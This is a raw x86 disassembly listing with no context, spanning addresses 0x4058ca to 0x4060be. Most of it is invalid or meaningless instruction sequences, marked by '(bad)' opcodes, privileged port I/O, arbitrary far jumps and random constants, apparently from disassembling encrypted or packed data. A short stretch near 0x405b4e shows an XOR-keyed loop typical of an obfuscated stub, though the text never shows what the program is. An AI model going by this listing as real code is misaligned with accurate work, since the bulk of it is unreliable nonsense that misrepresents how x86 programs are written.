  4058ca:	addr16 mov ds:0x3ddc,al
  4058ce:	inc    ch
  4058d0:	lods   al,BYTE PTR ds:[esi]
  4058d1:	(bad)  
  4058d2:	mov    esi,0xaf65f4d1
  4058d7:	fld    QWORD PTR [ebx]
  4058d9:	cmp    al,0x29
  4058db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058dc:	mov    bl,0xe0
  4058de:	vpxor  xmm4,xmm2,XMMWORD PTR ds:0x6443afc6
  4058e6:	ror    ecx,0x5d
  4058e9:	rcl    DWORD PTR [edi+0x9],0x9b
  4058ed:	jp     0x405897
  4058ef:	xor    eax,0x318506de
  4058f4:	inc    edi
  4058f5:	mov    dh,BYTE PTR [eax+0x2e2d96d7]
  4058fb:	out    dx,al
  4058fc:	rcr    BYTE PTR [eax],1
  4058fe:	add    DWORD PTR [edi+0x453018e4],edi
  405904:	inc    ebx
  405905:	sbb    eax,0x8ecb8371
  40590a:	xchg   DWORD PTR [eax],ecx
  40590c:	dec    esi
  40590d:	outs   dx,BYTE PTR ds:[esi]
  40590e:	lds    edx,FWORD PTR [eax+esi*8-0x1d]
  405912:	jge    0x4058fb
  405914:	bound  edi,QWORD PTR cs:0x71cbbb4e
  40591b:	int    0x87
  40591d:	jl     0x405933
  40591f:	dec    edx
  405920:	call   0x5e77:0xd158a4ce
  405927:	and    BYTE PTR [edx+ecx*8],cl
  40592a:	in     eax,dx
  40592b:	(bad)  
  40592c:	cmp    BYTE PTR [ecx],cl
  40592e:	dec    eax
  40592f:	ins    DWORD PTR es:[edi],dx
  405930:	pop    ss
  405931:	test   ebx,0xf330d9fa
  405937:	mov    DWORD PTR [eax+0x70],ebx
  40593a:	(bad)  
  40593c:	test   al,0xe6
  40593e:	shl    BYTE PTR [esi+0x1e],cl
  405941:	fisubr DWORD PTR [edx]
  405943:	popf   
  405944:	add    DWORD PTR [esi-0x15],ebx
  405947:	push   ebp
  405948:	push   ecx
  405949:	outs   dx,DWORD PTR ds:[esi]
  40594a:	das    
  40594b:	out    dx,al
  40594c:	lock retf 0xfe42
  405950:	mov    ds:0x67e7caad,eax
  405955:	adc    eax,0x229f9c3e
  40595a:	sbb    BYTE PTR [ebp+edx*1-0x44],0x56
  40595f:	pushf  
  405960:	mov    esp,0x25fa460e
  405965:	fs jnp 0x40590c
  405968:	dec    ecx
  405969:	push   0x5c
  40596b:	push   edx
  40596c:	enter  0xb0db,0x9d
  405970:	out    0xdd,al
  405972:	dec    eax
  405973:	inc    esp
  405974:	loope  0x40593d
  405976:	mov    ds:0xe4fe3e7d,eax
  40597b:	add    al,dh
  40597d:	sbb    ah,al
  40597f:	cld    
  405980:	pop    esi
  405981:	jne    0x40599b
  405983:	loope  0x405967
  405985:	mov    es,WORD PTR [esi+0x4b8682b6]
  40598b:	retf   
  40598c:	sbb    BYTE PTR ds:0x5a5170b6,0x12
  405993:	xor    al,0xdd
  405995:	sbb    edx,DWORD PTR [edi+0x205678b0]
  40599b:	mov    eax,ds:0x5eb14ff3
  4059a0:	dec    edx
  4059a1:	sub    dh,BYTE PTR [eax+0x2eb1c213]
  4059a7:	sbb    BYTE PTR [ebx],ch
  4059a9:	sub    cl,BYTE PTR [edi+ecx*2]
  4059ac:	rcr    DWORD PTR [eax+0x70],0xef
  4059b0:	cwde   
  4059b1:	sbb    eax,0x13786355
  4059b6:	or     edx,DWORD PTR [ebp+0x34]
  4059b9:	push   cs
  4059ba:	push   ecx
  4059bb:	mov    ebx,0xb7f47351
  4059c0:	cmp    ch,BYTE PTR [eax-0x80]
  4059c3:	fcmovnu st,st(5)
  4059c5:	pop    es
  4059c6:	cmp    eax,DWORD PTR ds:0xe7c05c5d
  4059cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059cd:	leave  
  4059ce:	or     esi,DWORD PTR [ebx+0x71a66f6b]
  4059d4:	mov    bh,0x37
  4059d6:	push   es
  4059d7:	mov    BYTE PTR [esi+0x54],ch
  4059da:	shl    BYTE PTR [ebp-0x2],1
  4059dd:	sbb    BYTE PTR [ecx-0x6009799f],0x84
  4059e4:	xlat   BYTE PTR ds:[ebx]
  4059e5:	fisub  DWORD PTR [edi]
  4059e7:	pop    ds
  4059e8:	repz call 0x77b7:0x86a7788c
  4059f0:	das    
  4059f1:	mov    ?,WORD PTR [edx]
  4059f3:	mov    al,0xb8
  4059f5:	scas   eax,DWORD PTR es:[edi]
  4059f6:	rcr    DWORD PTR [ebp-0x23],cl
  4059f9:	pop    edi
  4059fa:	lods   eax,DWORD PTR ds:[esi]
  4059fb:	mov    esp,0x4ac0a35d
  405a00:	jge    0x4059da
  405a02:	add    ebx,DWORD PTR [ebp+eax*4+0x1c]
  405a06:	(bad)  
  405a07:	rep ins BYTE PTR es:[edi],dx
  405a09:	aam    0xf0
  405a0b:	test   BYTE PTR [ebx],dl
  405a0d:	xchg   esi,eax
  405a0e:	dec    edi
  405a0f:	es test al,0x83
  405a12:	enter  0xfc27,0x87
  405a16:	xchg   edi,eax
  405a17:	das    
  405a18:	xrstor [ebx+0x306f42c3]
  405a1f:	dec    ecx
  405a20:	cli    
  405a21:	retf   
  405a22:	xor    al,0x23
  405a24:	adc    BYTE PTR [ebp+ecx*2-0x2446df83],ch
  405a2b:	leave  
  405a2c:	jl     0x405a06
  405a2e:	cmp    eax,0x6794f61b
  405a33:	and    BYTE PTR [edi-0x5c36d173],al
  405a39:	sub    DWORD PTR [edx-0x68],esp
  405a3c:	mov    esi,0x5aeb2f59
  405a42:	jmp    0xa339:0xb79d6c1b
  405a49:	add    esi,DWORD PTR ds:0x1c80b589
  405a4f:	fwait
  405a50:	mov    BYTE PTR [eax],al
  405a52:	inc    esp
  405a53:	je     0x405aa5
  405a55:	les    esp,FWORD PTR [ecx+0x2575b89e]
  405a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a5c:	jne    0x405a35
  405a5e:	mov    edi,0x8d034a85
  405a63:	mov    al,0x75
  405a65:	add    al,0x97
  405a67:	dec    esp
  405a68:	xchg   DWORD PTR [ecx-0xace5bb],edi
  405a6e:	in     eax,0x8f
  405a70:	pop    ebp
  405a71:	and    ch,BYTE PTR [ebx-0x2]
  405a74:	cmp    DWORD PTR [edx+0x58fd9ab2],ecx
  405a7a:	add    eax,0x67df5d4b
  405a7f:	(bad)  
  405a80:	cmp    ah,BYTE PTR [ebp+edx*2+0x2ebcc02e]
  405a87:	mov    ah,0x5c
  405a89:	pop    edx
  405a8a:	mov    eax,ds:0x72f962f1
  405a8f:	mov    esi,0x13aeef9d
  405a94:	mov    BYTE PTR [ebp-0x26bd2f50],dl
  405a9a:	pop    es
  405a9b:	mov    al,0xe2
  405a9d:	gs xor eax,0xeba6cb5f
  405aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa4:	mov    bh,0xb2
  405aa6:	arpl   di,cx
  405aa8:	icebp  
  405aa9:	ins    DWORD PTR es:[edi],dx
  405aaa:	dec    eax
  405aab:	jg     0x405a87
  405aad:	jae    0x405a3c
  405aaf:	xchg   edi,eax
  405ab0:	inc    edx
  405ab1:	fsubr  DWORD PTR [edi-0x7f]
  405ab4:	or     dh,ah
  405ab6:	push   esp
  405ab7:	cmc    
  405ab8:	push   ebp
  405ab9:	push   eax
  405aba:	push   eax
  405abb:	leave  
  405abc:	xchg   esi,eax
  405abd:	fbstp  TBYTE PTR [eax+0x14]
  405ac0:	(bad)  [ebp+0x30]
  405ac3:	stos   BYTE PTR es:[edi],al
  405ac4:	cmp    eax,0xd4689e60
  405ac9:	addr16 or al,0xcd
  405acc:	dec    esi
  405acd:	xchg   esi,eax
  405ace:	(bad)  
  405ad0:	in     al,0xd6
  405ad2:	sbb    eax,0xb6a78023
  405ad7:	in     eax,0x96
  405ad9:	in     eax,dx
  405ada:	mul    BYTE PTR [edx]
  405adc:	into   
  405add:	inc    edi
  405ade:	test   al,0x4c
  405ae0:	dec    ebx
  405ae1:	cmp    BYTE PTR ds:0xa8d3d5e9,0x27
  405ae8:	mov    edi,0xa33fb8b5
  405aee:	mov    edi,0x92b8caaa
  405af3:	repnz adc DWORD PTR [ecx+0x7a7e3ca9],0x58ac206c
  405afe:	mov    esp,0x43aeb224
  405b03:	xor    bh,ch
  405b05:	mov    cl,0x73
  405b07:	jle    0x405b3e
  405b09:	mov    dh,0x3c
  405b0b:	dec    ebx
  405b0c:	inc    ebp
  405b0d:	jp     0x405b48
  405b0f:	cwde   
  405b10:	jns    0x405ae1
  405b12:	das    
  405b13:	cdq    
  405b14:	repnz fdiv QWORD PTR [edi-0x3]
  405b18:	out    0x9,al
  405b1a:	dec    edi
  405b1b:	dec    edi
  405b1c:	mov    eax,ds:0x102907d7
  405b21:	cmp    eax,0x1df609d3
  405b26:	out    dx,al
  405b27:	imul   edi,DWORD PTR [edi+0x36e29bbb],0x68
  405b2e:	outs   dx,DWORD PTR ds:[esi]
  405b2f:	push   es
  405b30:	popa   
  405b31:	jns    0x6df96b84
  405b37:	or     al,0x0
  405b39:	add    bh,al
  405b3b:	inc    ebp
  405b3c:	or     BYTE PTR [ebp-0x38f0cb32],bh
  405b42:	inc    ebp
  405b43:	cld    
  405b44:	test   DWORD PTR ds:[eax+edi*8-0x637acd47],ebx
  405b4c:	clc    
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43381b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4337d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433823,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43386f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4338af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x17b4e225
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405ba3
  405be0:	icebp  
  405be1:	or     esi,DWORD PTR ds:0x375d639c
  405be7:	popa   
  405be8:	enter  0x20f,0x58
  405bec:	add    al,0xc3
  405bee:	ja     0x405bfc
  405bf0:	pop    eax
  405bf1:	mov    esi,0x9fb59fff
  405bf6:	call   edx
  405bf8:	jae    0x405c4e
  405bfa:	pop    ss
  405bfb:	jp     0x405c71
  405bfd:	and    al,0x3a
  405bff:	fcomp  DWORD PTR ds:0xc0fd6578
  405c05:	ja     0x405c17
  405c07:	cmp    ah,BYTE PTR [ecx*4+0x102619b3]
  405c0e:	pop    ecx
  405c0f:	cld    
  405c10:	cwde   
  405c11:	xor    BYTE PTR ds:0xb26e9054,cl
  405c17:	mov    BYTE PTR [edi-0x13],cl
  405c1a:	inc    esi
  405c1b:	xor    BYTE PTR [edx+0x71e08266],bh
  405c21:	test   al,0x54
  405c23:	dec    ecx
  405c24:	mov    cl,0x26
  405c26:	loope  0x405c0f
  405c28:	cmp    ebx,DWORD PTR [edi+edx*1]
  405c2b:	pop    eax
  405c2c:	or     al,0xb2
  405c2e:	xchg   esp,eax
  405c2f:	(bad)  ds:0xc6bbaab4
  405c35:	fwait
  405c36:	sbb    al,BYTE PTR [edx-0x1019661c]
  405c3c:	sbb    ah,BYTE PTR [ebx-0x7b9f81d7]
  405c42:	test   BYTE PTR [ecx],ah
  405c44:	mov    eax,0xe5f28119
  405c49:	jnp    0x405c7d
  405c4b:	and    esi,edi
  405c4d:	iret   
  405c4e:	pop    ecx
  405c4f:	mov    ah,0xab
  405c51:	jo     0x405c53
  405c53:	xchg   esp,eax
  405c54:	xchg   esi,eax
  405c55:	xchg   esp,eax
  405c56:	cwde   
  405c57:	xchg   ebp,eax
  405c58:	scas   eax,DWORD PTR es:[edi]
  405c59:	sahf   
  405c5a:	arpl   cx,sp
  405c5c:	imul   edi,ebx,0x5a8c0a30
  405c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c63:	pop    ebp
  405c64:	pop    esi
  405c65:	test   BYTE PTR ds:0x9aa8cd11,bh
  405c6b:	mov    esp,DWORD PTR [ebx-0x255c77d7]
  405c71:	sub    al,0xb4
  405c73:	jno    0x405c3b
  405c75:	xor    edi,eax
  405c77:	lods   eax,DWORD PTR ds:[esi]
  405c78:	adc    eax,0x59b2427a
  405c7d:	test   BYTE PTR [esi+eiz*1+0x319d1443],al
  405c84:	(bad)  
  405c86:	test   esp,edi
  405c88:	xchg   ecx,eax
  405c89:	aas    
  405c8a:	fstp   TBYTE PTR [ebx-0x45]
  405c8d:	jl     0x405c85
  405c8f:	xor    BYTE PTR [ecx+0x3ea11ea5],dh
  405c95:	int3   
  405c96:	sahf   
  405c97:	shr    DWORD PTR [edx+ebp*8+0x4f],1
  405c9b:	push   esi
  405c9c:	cmp    eax,0xdb5677c9
  405ca1:	popf   
  405ca2:	mov    cl,0xe3
  405ca4:	fisttp QWORD PTR [edx+0x6]
  405ca7:	sub    bh,BYTE PTR [eax]
  405ca9:	push   es
  405caa:	inc    esp
  405cab:	outs   dx,BYTE PTR ds:[esi]
  405cac:	neg    DWORD PTR [edx]
  405cae:	inc    ecx
  405caf:	rcr    BYTE PTR [ecx-0x74],1
  405cb2:	cdq    
  405cb3:	scas   al,BYTE PTR es:[edi]
  405cb4:	cmp    cl,ah
  405cb6:	adc    DWORD PTR [edi+0x59],0xfffffff8
  405cba:	lds    ebx,FWORD PTR [ebx+0x37]
  405cbd:	cmc    
  405cbe:	jb     0x405c4c
  405cc0:	ins    DWORD PTR es:[edi],dx
  405cc1:	push   ds
  405cc2:	xchg   DWORD PTR [edi-0x1b4789b8],ebp
  405cc8:	into   
  405cc9:	stos   DWORD PTR es:[edi],eax
  405cca:	pop    ebp
  405ccb:	push   eax
  405ccc:	cmp    eax,0x132edb71
  405cd1:	mov    ecx,0xbdafc940
  405cd6:	sub    eax,0xcb904530
  405cdb:	mov    ss,WORD PTR [ebp+0x17]
  405cde:	jno    0x405cee
  405ce0:	xchg   BYTE PTR [edx-0x357a3ef2],dh
  405ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ce7:	loopne 0x405ced
  405ce9:	and    cl,BYTE PTR [esi]
  405ceb:	sub    ebp,DWORD PTR [ebx-0x2d0d47a1]
  405cf1:	std    
  405cf2:	outs   dx,DWORD PTR ds:[esi]
  405cf3:	sahf   
  405cf4:	pop    edx
  405cf5:	cmp    ecx,ebx
  405cf7:	in     eax,0x53
  405cf9:	xchg   edi,eax
  405cfa:	xchg   DWORD PTR [ecx],ebx
  405cfc:	push   ebx
  405cfd:	inc    ebp
  405cfe:	out    dx,eax
  405cff:	arpl   WORD PTR ds:0x7df2ee8e,di
  405d05:	mov    al,ds:0xc9a5ae6c
  405d0a:	outs   dx,BYTE PTR ds:[esi]
  405d0b:	fwait
  405d0c:	in     eax,dx
  405d0d:	push   esp
  405d0e:	lock xor DWORD PTR [esp+ebp*2],edx
  405d12:	jno    0x405ce5
  405d14:	in     al,dx
  405d15:	mov    ebp,0xecc2ac63
  405d1a:	sub    bl,bl
  405d1c:	xchg   esp,eax
  405d1d:	ror    DWORD PTR [ebx+0x7586c3ef],cl
  405d23:	sbb    BYTE PTR [edx],0xa9
  405d26:	mov    esi,0x1d09069d
  405d2b:	inc    ebx
  405d2c:	or     al,0xe3
  405d2e:	or     cl,BYTE PTR [eax-0x228b5e81]
  405d34:	pushf  
  405d35:	jmp    0xa773:0xdec359ef
  405d3c:	in     al,dx
  405d3d:	push   es
  405d3e:	jg     0x405d56
  405d40:	xchg   ebp,eax
  405d41:	cmp    ebp,DWORD PTR [ecx-0x6c]
  405d44:	pusha  
  405d45:	jecxz  0x405d31
  405d47:	inc    ebp
  405d48:	push   esi
  405d49:	mov    ebx,0x2f7ba2e3
  405d4e:	rol    DWORD PTR [edx+0x227e14b6],1
  405d54:	ret    0xc2fd
  405d57:	leave  
  405d58:	sub    esp,DWORD PTR [edi+0x5560039c]
  405d5e:	div    DWORD PTR [ebx+0x7d]
  405d61:	fisttp DWORD PTR [esi-0x60]
  405d64:	pop    ds
  405d65:	mov    ebp,0x6a0e42e7
  405d6a:	jne    0x405d05
  405d6c:	mov    ds:0x42acb247,eax
  405d71:	xchg   ebp,eax
  405d72:	add    bh,ch
  405d74:	dec    esp
  405d75:	cdq    
  405d76:	call   0xb3c3:0xd4e0cef5
  405d7d:	push   DWORD PTR [eax-0x42]
  405d80:	rcr    BYTE PTR [eax+edx*1],1
  405d83:	js     0x405d87
  405d85:	sub    BYTE PTR [eax],dh
  405d87:	pop    esp
  405d88:	rcr    DWORD PTR [ebx-0x34],cl
  405d8b:	in     al,0xc4
  405d8d:	fisub  WORD PTR [edi+0x5d]
  405d90:	mov    es,eax
  405d92:	test   BYTE PTR [ebx+0x6],dl
  405d95:	leave  
  405d96:	mov    bl,0xf6
  405d98:	push   eax
  405d99:	dec    eax
  405d9a:	and    BYTE PTR [edx+esi*1-0x654445a3],bh
  405da1:	sbb    DWORD PTR ds:0x8e037d02,esp
  405da7:	sti    
  405da8:	cdq    
  405da9:	cdq    
  405daa:	aam    0x1f
  405dac:	out    0xa4,eax
  405dae:	jbe    0x405d60
  405db0:	mov    cs:0x7f28209b,eax
  405db6:	ret    
  405db7:	mov    ah,0xf7
  405db9:	out    dx,eax
  405dba:	les    ecx,FWORD PTR [ecx]
  405dbc:	repnz or eax,0x4b4d4a10
  405dc2:	iret   
  405dc3:	(bad)  
  405dc4:	jmp    0x405e21
  405dc6:	sub    eax,DWORD PTR [edi-0x2f93480b]
  405dcc:	adc    DWORD PTR [edi],edi
  405dce:	xchg   edx,eax
  405dcf:	jp     0x405d63
  405dd1:	jge    0x405daa
  405dd3:	into   
  405dd4:	fwait
  405dd5:	jns    0x405e52
  405dd7:	sahf   
  405dd8:	cs inc ebx
  405dda:	retf   
  405ddb:	out    0x4f,al
  405ddd:	imul   edx,DWORD PTR [esi],0x9871d787
  405de3:	aas    
  405de4:	retf   0x777f
  405de7:	push   0x27
  405de9:	dec    ebx
  405dea:	or     BYTE PTR [edx+esi*8],dh
  405ded:	sbb    ah,0xe
  405df0:	das    
  405df1:	xchg   DWORD PTR [esi-0x25],esp
  405df4:	sbb    al,0xc7
  405df6:	js     0x405e67
  405df8:	or     esi,DWORD PTR [edx-0x67]
  405dfb:	cmp    ecx,esi
  405dfd:	cmp    cl,bl
  405dff:	pop    esi
  405e00:	mov    ch,0xe7
  405e02:	(bad)  
  405e03:	retf   0xd0c3
  405e06:	out    dx,al
  405e07:	les    esi,FWORD PTR [ebx-0x7aa7cc17]
  405e0d:	mov    al,0xc4
  405e0f:	push   0x23
  405e11:	xchg   edi,ebx
  405e13:	leave  
  405e14:	fcom   DWORD PTR [eax]
  405e16:	mov    edi,0x3de59840
  405e1b:	cmc    
  405e1c:	into   
  405e1d:	or     al,0x5b
  405e1f:	jnp    0x405e62
  405e21:	stos   BYTE PTR es:[edi],al
  405e22:	test   eax,0x9626cefc
  405e27:	lods   eax,DWORD PTR ds:[esi]
  405e28:	in     eax,0xcc
  405e2a:	pop    ebp
  405e2b:	adc    al,al
  405e2d:	mov    eax,ds:0x2c5b04cb
  405e32:	jge    0x405e9b
  405e34:	mov    dl,0x37
  405e36:	pusha  
  405e37:	div    DWORD PTR [ecx+0x1092d685]
  405e3d:	xchg   edx,eax
  405e3e:	out    0xa4,al
  405e40:	mov    ch,bh
  405e42:	cwde   
  405e43:	jmp    0x405dde
  405e45:	clc    
  405e46:	pushf  
  405e47:	inc    edx
  405e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e49:	lds    eax,FWORD PTR [ecx]
  405e4b:	mov    esi,0x317891db
  405e50:	or     al,0x1e
  405e52:	pop    ecx
  405e53:	xchg   edx,eax
  405e54:	sbb    edx,DWORD PTR [esi]
  405e56:	sub    ch,dh
  405e58:	enter  0x769a,0xf0
  405e5c:	lds    esi,FWORD PTR [ebp+0x48]
  405e5f:	inc    esp
  405e60:	pop    ebp
  405e61:	push   ebx
  405e62:	xchg   DWORD PTR [ebp+0x2e],ebx
  405e65:	dec    esp
  405e66:	sbb    al,0x1e
  405e68:	jo     0x405e77
  405e6a:	cli    
  405e6b:	dec    edx
  405e6c:	or     edx,DWORD PTR [ebx]
  405e6e:	cmp    BYTE PTR [edx-0x4d],0xb2
  405e72:	stos   BYTE PTR es:[edi],al
  405e73:	push   esi
  405e74:	or     DWORD PTR [edi-0x5c1121ba],esi
  405e7a:	dec    esi
  405e7b:	fadd   st(3),st
  405e7d:	repz in eax,dx
  405e7f:	ins    BYTE PTR es:[edi],dx
  405e80:	xchg   ecx,eax
  405e81:	rcl    BYTE PTR [ecx-0x46],1
  405e84:	mov    WORD PTR [esi+ebp*4+0x70b3d7d4],ss
  405e8b:	pop    ebx
  405e8c:	out    dx,al
  405e8d:	jbe    0x405e26
  405e8f:	sbb    ebx,DWORD PTR [esi-0x56]
  405e92:	xchg   DWORD PTR [eax+0xc7bb19],esp
  405e98:	fisub  WORD PTR [ecx]
  405e9a:	icebp  
  405e9b:	sti    
  405e9c:	js     0x405f13
  405e9e:	fist   WORD PTR ds:0xd742f350
  405ea4:	and    al,0x90
  405ea6:	dec    edx
  405ea7:	setno  bh
  405eaa:	nop
  405eab:	fwait
  405eac:	out    dx,al
  405ead:	sbb    DWORD PTR [ebx+0xd125301],0x30
  405eb4:	mov    dh,0x1c
  405eb6:	or     BYTE PTR [ecx],bh
  405eb8:	sub    al,0x60
  405eba:	lea    esp,[ebx+0x79]
  405ebd:	pop    ecx
  405ebe:	jge    0x405e7c
  405ec0:	jmp    0x50ce9c47
  405ec5:	test   eax,0x1063bfd7
  405eca:	mov    al,0x7c
  405ecc:	in     al,0xc
  405ece:	ja     0x405e5e
  405ed0:	pop    ebx
  405ed1:	dec    esp
  405ed2:	mov    al,ds:0x7c424d14
  405ed7:	pop    edx
  405ed8:	retf   
  405ed9:	mov    esi,0x82e57a6b
  405ede:	mov    esi,0x27662185
  405ee3:	and    al,0x36
  405ee5:	in     eax,0x2c
  405ee7:	or     BYTE PTR [edi-0x7d],dh
  405eea:	or     al,0x26
  405eec:	sbb    eax,0xdc621c62
  405ef1:	dec    esi
  405ef2:	int3   
  405ef3:	jge    0x405e90
  405ef5:	out    dx,al
  405ef6:	jmp    0x3b1ebdac
  405efb:	push   eax
  405efc:	mov    al,ds:0xa2a1d91c
  405f01:	repz xchg ebp,eax
  405f03:	packssdw mm3,mm3
  405f06:	mov    ebp,0x57a227ca
  405f0b:	cmp    al,0x69
  405f0d:	lods   eax,DWORD PTR ds:[esi]
  405f0e:	mov    eax,ds:0xf133a578
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [esi],es
  405f27:	rol    BYTE PTR [eax+0x7e30a6bc],0x7e
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	pop    esp
  405f33:	push   edi
  405f34:	push   ebx
  405f35:	jo     0x405f85
  405f37:	mov    eax,ds:0xadc4e697
  405f3c:	lods   eax,DWORD PTR ds:[esi]
  405f3d:	dec    edx
  405f3e:	sbb    eax,0x8a4c1baf
  405f43:	xchg   ebp,eax
  405f44:	jecxz  0x405ed8
  405f46:	hlt    
  405f47:	xchg   ebp,eax
  405f48:	dec    ecx
  405f49:	(bad)  
  405f4a:	sbb    al,0x34
  405f4c:	ret    0xf16a
  405f4f:	xor    dh,ch
  405f51:	inc    ebp
  405f52:	sub    al,0x9d
  405f54:	ficomp WORD PTR ds:0x1b527f8e
  405f5a:	mov    ebx,0x1de2e1f9
  405f5f:	add    BYTE PTR [esi],0x77
  405f62:	pop    esi
  405f63:	aaa    
  405f64:	in     eax,0x9
  405f66:	fsubr  DWORD PTR [edi+0x72]
  405f69:	inc    esp
  405f6a:	pop    edi
  405f6b:	adc    eax,0xfde7cef2
  405f70:	push   esp
  405f71:	popa   
  405f72:	in     al,dx
  405f73:	scas   al,BYTE PTR es:[edi]
  405f74:	cmp    dl,BYTE PTR [ebx-0x28]
  405f77:	data16 mov bl,0xcc
  405f7a:	out    0x7,al
  405f7c:	push   ss
  405f7d:	icebp  
  405f7e:	rcl    DWORD PTR [edi+0x76],1
  405f81:	push   ecx
  405f82:	(bad)  
  405f83:	cmc    
  405f84:	or     BYTE PTR [eax],0xe4
  405f87:	add    edi,DWORD PTR [eax+edx*2]
  405f8a:	(bad)  
  405f8b:	iret   
  405f8c:	mov    al,ds:0x94ed1b43
  405f91:	pop    ebx
  405f92:	scas   eax,DWORD PTR es:[edi]
  405f93:	lods   al,BYTE PTR ds:[esi]
  405f94:	push   edi
  405f95:	aam    0x82
  405f97:	dec    eax
  405f98:	test   DWORD PTR [edi+0x3a72cc19],edx
  405f9e:	cmp    esp,DWORD PTR [ecx]
  405fa0:	hlt    
  405fa1:	dec    ebp
  405fa2:	jmp    ebx
  405fa4:	in     al,dx
  405fa5:	xchg   ecx,eax
  405fa6:	ret    
  405fa7:	(bad)
  405faa:	fs gs pop eax
  405fad:	and    eax,DWORD PTR [ebx]
  405faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fb0:	sub    DWORD PTR [ebx],ebx
  405fb2:	mov    DWORD PTR [ebx+ecx*2],eax
  405fb5:	lock push ss
  405fb7:	inc    ebp
  405fb8:	fisub  DWORD PTR [eax]
  405fba:	stc    
  405fbb:	mov    esp,cs
  405fbd:	into   
  405fbe:	cmp    dl,BYTE PTR [esi-0x308995c0]
  405fc4:	adc    DWORD PTR [eax+ecx*1-0x5275f3c1],0x21
  405fcc:	mov    ds,eax
  405fce:	add    edx,edi
  405fd0:	and    ebp,DWORD PTR [eax]
  405fd2:	cmp    al,0x7a
  405fd4:	pop    ss
  405fd5:	push   cs
  405fd6:	enter  0x4137,0x46
  405fda:	ret    0x408c
  405fdd:	shl    BYTE PTR [esp+ebx*8-0x5c],1
  405fe1:	xchg   DWORD PTR [edi],esp
  405fe3:	push   cs
  405fe4:	fdivr  DWORD PTR ds:0x80d4deba
  405fea:	adc    bh,ch
  405fec:	mov    al,ds:0x2e4143bb
  405ff1:	fwait
  405ff2:	idiv   edi
  405ff4:	stc    
  405ff5:	enter  0x6601,0x72
  405ff9:	imul   esi,DWORD PTR [esi-0x29],0x2e10cc29
  406000:	neg    BYTE PTR [edx-0x6531a6c7]
  406006:	mov    bl,0x3e
  406008:	adc    eax,0x65f032b9
  40600d:	in     al,0x7b
  40600f:	add    DWORD PTR [eax+eiz*8+0x39],edx
  406013:	sub    DWORD PTR [edi],ecx
  406015:	sbb    bh,cl
  406017:	outs   dx,DWORD PTR ds:[esi]
  406018:	outs   dx,BYTE PTR ds:[esi]
  406019:	sbb    ebp,edi
  40601b:	fiadd  DWORD PTR [ebx-0x470af0f4]
  406021:	xchg   esi,eax
  406022:	add    al,dl
  406024:	and    eax,0x7c91b
  406029:	mov    ebx,0x3123cbd8
  40602e:	sti    
  40602f:	jg     0x406026
  406031:	je     0x40601f
  406033:	or     al,0xbc
  406035:	in     eax,dx
  406036:	lahf   
  406037:	test   al,0xfd
  406039:	push   ebx
  40603a:	std    
  40603b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40603c:	shl    BYTE PTR [eax-0x175084bc],0x20
  406043:	inc    edx
  406044:	mov    eax,ds:0xc95789ff
  406049:	inc    eax
  40604a:	fbld   TBYTE PTR [edi+edx*2]
  40604d:	call   0xfd40:0xd3d73b41
  406054:	pop    eax
  406055:	jge    0x4060af
  406057:	jo     0x406001
  406059:	(bad)  
  40605b:	into   
  40605c:	cs dec ebx
  40605e:	sub    BYTE PTR [ebp-0x45ab0b51],bl
  406064:	ret    
  406065:	mov    al,0x86
  406067:	imul   esi,DWORD PTR [edx+edi*1],0x70d80e1a
  40606e:	and    BYTE PTR [ebp-0x54e4e6c5],al
  406074:	dec    ebp
  406075:	mov    edx,0x7638c15a
  40607a:	mov    ebx,DWORD PTR [esi-0x3e70e3f9]
  406080:	sub    cl,BYTE PTR [esi]
  406082:	push   esi
  406083:	jle    0x406080
  406085:	in     eax,dx
  406086:	sub    dh,BYTE PTR [edx]
  406088:	cmp    bl,BYTE PTR [ecx-0x2633aca7]
  40608e:	adc    DWORD PTR [eax+0x305445d9],edi
  406094:	mov    eax,ds:0xeaf18179
  406099:	fisubr WORD PTR [ebx]
  40609b:	mov    ch,0x8d
  40609d:	shl    DWORD PTR [ebx],0x7f
  4060a0:	imul   ebp,ebx,0x8ea59397
  4060a6:	test   edi,edx
  4060a8:	cmp    ch,bl
  4060aa:	cwde   
  4060ab:	call   DWORD PTR [eax+ecx*8+0x51ae76a8]
  4060b2:	sub    edi,DWORD PTR [esi-0x59]
  4060b5:	ds leave 
  4060b7:	dec    edi
  4060b8:	jb     0x406095
  4060ba:	or     edi,DWORD PTR [edi+eax*1-0x29]
  4060be:	pop    edx
